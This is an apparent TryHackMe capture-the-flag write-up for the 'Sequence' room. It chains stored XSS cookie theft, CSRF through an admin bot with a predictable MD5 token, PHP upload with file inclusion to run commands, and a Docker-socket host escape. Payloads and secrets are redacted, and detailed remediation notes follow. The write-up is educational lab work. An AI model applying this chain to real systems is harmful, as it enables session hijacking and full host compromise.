# Sequence Challenge

![Banner](./../IMAGES/sequence_img.png?raw=true)

**Pathway:** *Web Application Red Teaming* | **Section:** *Chaining Vulnerabilities* | **Challenge:** *[Sequence](https://tryhackme.com/room/sequence)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **22 July 2026**.
>
> **Spoiler warning:** This write-up documents the exploitation chain, but credentials, exact challenge-specific values, session identifiers, tokens, payload details and flag codes are not shown.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, internal values, session cookies, predictable tokens, payload components, filenames or other challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

Sequence is a multi-stage web application red-team challenge centred on a fictional review platform. The objective was to chain several weaknesses together, move from an unauthenticated visitor to a moderator account, escalate to an administrator role, obtain remote command execution inside a container and finally use an exposed Docker socket to access the host filesystem.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating the exposed SSH and HTTP services.
3. Discovering web application routes, directories and an exposed mail archive.
4. Recovering a password protecting an internal Finance feature.
5. Exploiting stored cross-site scripting to capture a moderator session.
6. Replaying the stolen session to access moderator-only functionality.
7. Identifying a predictable anti-CSRF token pattern.
8. Using the administrator bot to perform a privileged account-promotion request.
9. Resetting the promoted account password and obtaining a fresh administrator session.
10. Accessing a hidden Finance panel through an unsafe feature-loader parameter.
11. Capturing the real administrator session through stored cross-site scripting.
12. Uploading a PHP file through the Finance panel.
13. Executing the uploaded PHP through the vulnerable feature loader.
14. Discovering a mounted Docker socket inside the application container.
15. Using the Docker API to create a helper container with the host filesystem mounted.
16. Reading the root-level flag from the host.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: review.thm
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> review.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts review.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address.

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms depend on hostname-based routing, virtual hosts, redirects, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but not something anybody should be proud of.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry can be removed with:

```bash
sudo sed -i '/review\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` for validating local hostname resolution.
- `ping` for confirming basic connectivity.
- `nmap` and `rustscan` for TCP port, service and script enumeration.
- `dirsearch`, `gobuster`, `ffuf` and `feroxbuster` for web content discovery.
- cURL for interacting with the application, replaying sessions and calling the Docker API.
- Firefox for manual interaction with the web application.
- Python 3's HTTP server for receiving cross-site scripting callbacks.
- `md5sum` for testing the predictable anti-CSRF token pattern.
- Standard Linux utilities including `grep`, `cat`, `ls`, `stat`, `mount`, `strings` and `base64`.
- The Docker Engine API exposed through `/run/docker.sock`.
- A minimal PHP command-execution file used only inside the authorised lab.

Click [HERE](https://github.com/Valikahn/TryHackMe-Web-Application-Red-Teaming#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

A full TCP scan identified two exposed services:

```bash
nmap -p- <REDACTED>
rustscan -a <REDACTED>
```

The principal findings were:

```text
22/tcp open  ssh
80/tcp open  http
```

Service and default-script enumeration was then performed:

```bash
nmap -sC -sV -Pn -oN sequence_initial_scan.txt <REDACTED>
rustscan -a <REDACTED> --ulimit 5000 -- -sC -sV -Pn
```

The HTTP service was Apache on Ubuntu and presented a review-shop application.

### Web Content Discovery

Several content-discovery tools were used to compare results:

```bash
dirsearch -u http://<REDACTED>/
```

```bash
gobuster dir \
  -u http://<REDACTED>/ \
  -w /usr/share/wordlists/dirb/big.txt
```

```bash
ffuf \
  -u 'http://<REDACTED>/FUZZ' \
  -w /usr/share/wordlists/dirb/big.txt \
  -mc all \
  -fc 404 \
  -e .php,.txt,.html,.py
```

```bash
feroxbuster \
  -u http://<REDACTED>/ \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,txt,html,py \
  -t 50 \
  -C 404 \
  --redirects
```

The most important discoveries were:

```text
/login.php
/contact.php
/dashboard.php
/chat.php
/settings.php
/admin_view.php
/mail/
/uploads/
/phpmyadmin/
<REDACTED>
```

Directory listing was enabled beneath both `/mail/` and `/uploads/`.

### Exposed Mail Archive

A text file beneath the mail directory was retrieved:

```bash
curl -s -i http://<REDACTED>/mail/<REDACTED>
```

The message disclosed:

- The existence of hidden Finance and Lottery features.
- That the Finance feature was intended for an internal network.
- A completed eight-character password protecting the Finance panel.

The exact password is intentionally redacted:

```text
<REDACTED>
```

This disclosure did not immediately provide access, but it became useful after administrator privileges were obtained.

## Exploits

### Stored Cross-Site Scripting

The public contact or feedback functionality accepted attacker-controlled content that was later viewed by a privileged user.

A callback listener was started on the Kali VM:

```bash
python3 -m http.server 80
```

A stored cross-site scripting payload was submitted through the application. The exact payload is intentionally redacted:

```html
<REDACTED>
```

When the moderator bot reviewed the stored feedback, its browser requested the Kali listener and disclosed a PHP session cookie:

```text
GET /?<REDACTED>=PHPSESSID=<REDACTED>
```

The session identifier is not shown in this public write-up.

### Moderator Session Replay

The captured cookie was replayed against the authenticated dashboard:

```bash
curl -s \
  -b 'PHPSESSID=<REDACTED>' \
  http://<REDACTED>/dashboard.php
```

The response confirmed access as the moderator account and exposed the first flag:

```text
THM{....}
```

The moderator dashboard also revealed:

- Access to a private chat with the administrator bot.
- Access to stored feedback.
- A settings panel.
- A table showing the current users and roles.

### Predictable Anti-CSRF Token

The settings page contained forms for changing the current password and promoting a co-administrator.

```bash
curl -s \
  -b 'PHPSESSID=<REDACTED>' \
  http://<REDACTED>/settings.php
```

Both forms used the same token value. Testing showed that the token was predictable and derived from the username using MD5.

The administrator token was calculated locally:

```bash
echo -n '<REDACTED>' | md5sum
```

The resulting value is intentionally redacted:

```text
<REDACTED>
```

A direct promotion request from the moderator session failed because the endpoint checked the current session role:

```text
This feature is currently only available for admins.
```

The endpoint therefore had to be requested from the administrator's authenticated browser.

### Administrator-Bot CSRF

The moderator-only chat accepted messages for an online administrator bot. A plain URL targeting the account-promotion endpoint was submitted through the chat:

```bash
curl -s \
  -b 'PHPSESSID=<REDACTED>' \
  --data-urlencode 'message=http://<REDACTED>/<REDACTED>?username=<REDACTED>&csrf_token_promote=<REDACTED>' \
  http://<REDACTED>/chat.php
```

When the administrator bot visited the URL, its authenticated session satisfied the role check and promoted the moderator account.

The change was confirmed through the dashboard's user table:

```text
Username: <REDACTED>
Role: admin
```

### Fresh Administrator Session

The existing PHP session still held the previous moderator role. The promoted account password was therefore changed through the settings functionality:

```bash
curl -s \
  -b 'PHPSESSID=<REDACTED>' \
  -X POST \
  -d 'new_password=<REDACTED>&csrf_token=<REDACTED>' \
  http://<REDACTED>/update_password.php
```

A fresh login was performed using the promoted account:

```bash
curl -s \
  -c admin_session.txt \
  -d 'email=<REDACTED>&password=<REDACTED>' \
  http://<REDACTED>/login.php
```

The new session loaded the updated role and exposed the administrator flag:

```text
THM{....}
```

### Hidden Finance Panel

The administrator dashboard offered a visible Lottery option, but its `feature` parameter accepted an arbitrary PHP filename.

A request was made for the hidden Finance feature:

```bash
curl -s \
  -b admin_session.txt \
  -d 'feature=<REDACTED>' \
  http://<REDACTED>/dashboard.php
```

The response returned the Finance panel despite it not being present in the visible drop-down menu.

The panel contained:

- Client-side password validation.
- Investor information.
- A file-upload form.
- Obfuscated JavaScript containing the password already disclosed in the mail archive.

This demonstrated that the application's internal-access and password controls were enforced only in the browser.

### Capturing the Real Administrator Session

Although the promoted account had the administrator role, the upload feature was tied to the real administrator account.

The original stored cross-site scripting payload remained present in the feedback view. A link to the privileged feedback page was sent through chat so that the real administrator bot would open it:

```bash
curl -s \
  -b admin_session.txt \
  --data-urlencode 'message=http://<REDACTED>/admin_view.php' \
  http://<REDACTED>/chat.php
```

The callback listener received a second PHP session cookie:

```text
GET /?<REDACTED>=PHPSESSID=<REDACTED>
```

Replaying this session confirmed the real administrator identity:

```bash
curl -s \
  -b 'PHPSESSID=<REDACTED>' \
  http://<REDACTED>/dashboard.php
```

```text
Welcome, admin!
You are logged in as admin.
```

### PHP File Upload

A minimal PHP command-execution file was created locally. Its exact contents are redacted because they would directly provide the room's command-execution payload:

```bash
echo '<REDACTED>' > <REDACTED>.php
```

The file was uploaded through the Finance panel using the real administrator session:

```bash
curl -s \
  -b 'PHPSESSID=<REDACTED>' \
  -F 'feature=<REDACTED>' \
  -F 'investor_file=@<REDACTED>.php;type=application/x-php' \
  http://<REDACTED>/dashboard.php
```

The application confirmed that the file had been written beneath the uploads directory:

```text
File uploaded successfully in uploads folder
File Name: <REDACTED>.php
Path: uploads/<REDACTED>.php
```

Directly requesting the uploaded file returned `404 Not Found`, meaning the upload location was not served directly through the public Apache path.

### Local File Inclusion to Command Execution

The unsafe `feature` parameter was then used to include the uploaded PHP file:

```bash
curl -s \
  -b 'PHPSESSID=<REDACTED>' \
  --data-urlencode 'feature=uploads/<REDACTED>.php?cmd=id' \
  http://<REDACTED>/dashboard.php
```

The response confirmed operating-system command execution:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This was root inside the application container, not yet root on the underlying host.

### Docker Socket Discovery

Container mount information was inspected:

```bash
curl -s \
  -b 'PHPSESSID=<REDACTED>' \
  --data-urlencode 'feature=uploads/<REDACTED>.php?cmd=mount' \
  http://<REDACTED>/dashboard.php
```

The important result was:

```text
/run/docker.sock
```

The socket metadata showed that container root could access it:

```text
File: /run/docker.sock
File type: socket
Access: srw-rw----
Owner: root
```

The Docker API was tested through the Unix socket:

```bash
curl --unix-socket /run/docker.sock http://localhost/version
```

The response returned Docker Engine version information, confirming that the container could control the host's Docker daemon.

### Docker API Enumeration

Available local images were listed:

```bash
curl --unix-socket /run/docker.sock \
  http://localhost/images/json
```

At least one local image suitable for a helper container was available:

```text
<REDACTED>
```

The exact image identifiers are intentionally omitted.

### Host Filesystem Mount

A Docker API request was constructed to create a temporary helper container. The configuration:

- Used an already available local image.
- Mounted the host's `/` filesystem at `/host`.
- Mounted it read-only.
- Executed a limited search for likely flag files.

The exact encoded request body is redacted:

```bash
<REDACTED>
```

The Docker API returned a new container identifier:

```json
{"Id":"<REDACTED>","Warnings":[]}
```

The helper container was then started:

```bash
curl --unix-socket /run/docker.sock \
  -X POST \
  http://localhost/containers/<REDACTED>/start
```

Its logs were retrieved through the Docker API and cleaned with `strings`:

```bash
curl --unix-socket /run/docker.sock \
  'http://localhost/containers/<REDACTED>/logs?stdout=1' \
  | strings
```

The output disclosed the host-side flag path and final flag:

```text
/host/root/<REDACTED>
THM{....}
```

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The allocated target and `tun0` addresses were confirmed. The room hostname was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring that the application was accessed through its expected hostname.

### 2. Service Discovery
Nmap and RustScan identified SSH and Apache HTTP services. No additional TCP services were exposed.

### 3. Web Enumeration
Directory and endpoint discovery identified the login, dashboard, contact, settings, chat, mail, uploads and administrative feedback functionality.

### 4. Information Disclosure
An exposed mail archive disclosed the existence of hidden Finance and Lottery features and revealed the password used by the Finance panel.

### 5. Stored Cross-Site Scripting
Attacker-controlled feedback was rendered when reviewed by the moderator bot. The stored script sent the moderator's PHP session cookie to the Kali listener.

### 6. Moderator Session Hijacking
The stolen cookie was replayed against the dashboard, providing moderator access and revealing the first flag:

```text
THM{....}
```

### 7. Predictable Token Discovery
The settings panel exposed identical tokens for password changes and account promotion. The value was predictable from the username using MD5.

### 8. Administrator-Bot CSRF
A crafted account-promotion URL was sent through the moderator chat. The administrator bot visited it while authenticated, causing the moderator account to be promoted.

### 9. Administrator Role Activation
The promoted account password was changed, and a fresh login created a new session that loaded the administrator role. This exposed the second flag:

```text
THM{....}
```

### 10. Hidden Feature Access
The dashboard's `feature` parameter was changed from the visible Lottery feature to the hidden Finance feature. The server included the requested PHP file without a secure allow-list.

### 11. Real Administrator Session Theft
The administrator bot was directed to the stored-feedback view, where the original stored cross-site scripting payload executed again. This captured the real administrator's PHP session.

### 12. Unrestricted File Upload
The real administrator session was used to upload a PHP file through the Finance panel. The server accepted the PHP extension and stored the file beneath the uploads directory.

### 13. File Inclusion and Command Execution
The uploaded PHP file was not directly web-accessible, but the vulnerable feature loader included it. Supplying a command parameter produced root command execution inside the container.

### 14. Docker Socket Exposure
The container mounted `/run/docker.sock`. Because the web process was executing as container root, it could communicate with the host Docker daemon.

### 15. Host Filesystem Access
The Docker API created a helper container with the host filesystem mounted at `/host`. The container searched for likely flag files and printed the result to its logs.

### 16. Final Objective
The helper container logs disclosed the root-level flag from the host filesystem:

```text
THM{....}
```

## Key Lessons

Sequence demonstrated several important penetration-testing and defensive-security lessons:

- Confirm VPN routing and local hostname resolution before troubleshooting application behaviour.
- Keep `/etc/hosts` tidy when using a personal Kali Linux VM for TryHackMe rooms.
- Hostname-based applications may fail in misleading ways when the expected virtual host is missing.
- Directory listings and forgotten text files can disclose high-value internal information.
- Client-side controls do not provide meaningful security against a determined attacker.
- Stored cross-site scripting can turn a privileged review bot into a session-theft mechanism.
- Session cookies without the `HttpOnly` attribute are exposed to JavaScript.
- Replaying a captured session can be more effective than attempting to recover the account password.
- Anti-CSRF tokens must be random, unpredictable and tied securely to the user's session.
- A privileged bot that automatically visits untrusted links can be abused for CSRF.
- Role changes may not affect an already established session until the user authenticates again.
- Hidden options in a user interface are not access controls.
- Server-side file inclusion must use a strict allow-list rather than attacker-controlled filenames.
- Uploading a file and executing it may require chaining multiple weaknesses.
- A PHP file does not need to be directly web-accessible if another vulnerability can include it.
- Root inside a container is not automatically root on the host.
- Mounting the Docker socket into an application container is effectively equivalent to granting host-root control.
- Docker API access should be treated as a critical security boundary.
- Helper containers can be used to mount and inspect the host filesystem when the daemon is exposed.
- Validate every stage of an attack chain before moving on.
- Public write-ups should document the method without publishing live credentials, exact tokens, session identifiers or flags.

The most important lesson was that none of the individual weaknesses needed to provide complete compromise by itself. The room was solved by recognising how each issue created the conditions required for the next one.

## Remediation Notes

### Hostname and Operational Hygiene

- Keep development and lab hostname mappings documented.
- Remove stale `/etc/hosts` entries after each challenge.
- Avoid reusing the same hostname for unrelated environments.
- Confirm that virtual-host routing fails safely when an unexpected hostname is used.
- Maintain separate working directories for scan results, evidence and exploit files.

### Information Disclosure

- Disable directory listing unless it is explicitly required.
- Remove mail dumps, deployment notes, backups and debug files from web-accessible directories.
- Do not publish internal paths, feature names or passwords in operational messages.
- Apply strict ownership and permissions to application data.
- Review web roots for forgotten files during deployment.
- Monitor access to unusual text, backup and configuration files.

### Cross-Site Scripting

- Apply context-aware output encoding to all user-controlled content.
- Sanitise rich-text input using a well-maintained allow-list library.
- Do not rely on browser-side keyword blocking.
- Set session cookies with `HttpOnly`, `Secure` and an appropriate `SameSite` policy.
- Use a restrictive Content Security Policy.
- Separate privileged review interfaces from untrusted content.
- Render potentially hostile submissions in a sandboxed environment.
- Avoid automated privileged bots visiting attacker-controlled content.

### Session Management

- Rotate session identifiers after login and privilege changes.
- Invalidate stolen or superseded sessions.
- Store the current role server-side and revalidate it for every privileged request.
- Apply short session lifetimes for privileged accounts.
- Provide administrators with session-management and forced-logout controls.
- Detect and alert on session reuse from unusual network locations.

### CSRF Protection

- Generate cryptographically random anti-CSRF tokens.
- Bind tokens to the authenticated session and intended action.
- Never derive a token from a username, email address or other predictable value.
- Use POST for state-changing actions.
- Apply `SameSite` cookies as an additional defence.
- Validate the `Origin` or `Referer` header where appropriate.
- Require re-authentication for sensitive role changes.
- Do not allow administrative bots to follow arbitrary links automatically.

### Authentication and Authorisation

- Enforce authorisation independently on every server-side endpoint.
- Do not treat hidden navigation items as a security control.
- Require explicit administrative approval for role promotion.
- Log all role changes with actor, target, source address and timestamp.
- Notify users when their role or password changes.
- Invalidate existing sessions after role or password changes.
- Separate moderation and administration privileges.

### Internal Feature Loading

- Replace attacker-controlled include paths with a strict server-side mapping.
- Do not pass raw request parameters to `include`, `require` or equivalent functions.
- Canonicalise paths before validation.
- Reject path separators, wrappers, query strings and unexpected extensions.
- Keep sensitive features outside the web root.
- Enforce network and role restrictions on the server rather than in JavaScript.
- Remove unused features from production deployments.

### File Upload Security

- Reject executable extensions including `.php`, `.phtml` and related variants.
- Validate file content rather than trusting the MIME type supplied by the client.
- Generate random server-side filenames.
- Store uploads outside the web root.
- Mount upload locations with `noexec` where possible.
- Serve uploaded content from a separate domain without script execution.
- Apply strict size, type and ownership controls.
- Scan uploaded files and log all upload events.
- Never include uploaded files as executable server-side code.

### Container Security

- Do not run the application container as root.
- Use a dedicated unprivileged user.
- Apply a read-only root filesystem where possible.
- Drop unnecessary Linux capabilities.
- Enable seccomp, AppArmor or SELinux controls.
- Avoid privileged containers.
- Restrict container network access.
- Keep container images minimal and patched.
- Separate secrets from the image and filesystem.
- Treat container-root compromise as a serious incident even when no host escape is immediately visible.

### Docker Socket Security

- Never mount `/var/run/docker.sock` or `/run/docker.sock` into an untrusted application container.
- Treat Docker daemon access as equivalent to host-root access.
- Use a narrowly scoped socket proxy only when daemon interaction is unavoidable.
- Apply authentication and authorisation to remote Docker APIs.
- Monitor Docker API calls and unexpected container creation.
- Restrict which users can access the Docker group.
- Audit running containers for Docker socket mounts.
- Alert on containers mounting the host root filesystem.
- Remove unused local images that could support attacker-created helper containers.
- Consider rootless container runtimes where operationally suitable.

### Monitoring and Incident Response

- Alert on unexpected requests to hidden PHP files and administrative routes.
- Detect outbound requests from privileged review bots to untrusted addresses.
- Monitor session-cookie reuse and privilege changes.
- Record file uploads and server-side includes.
- Monitor access to the Docker socket from application containers.
- Alert on new containers, unusual bind mounts and short-lived helper containers.
- Rotate credentials and invalidate sessions after suspected compromise.
- Preserve web, application, container and Docker daemon logs for investigation.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
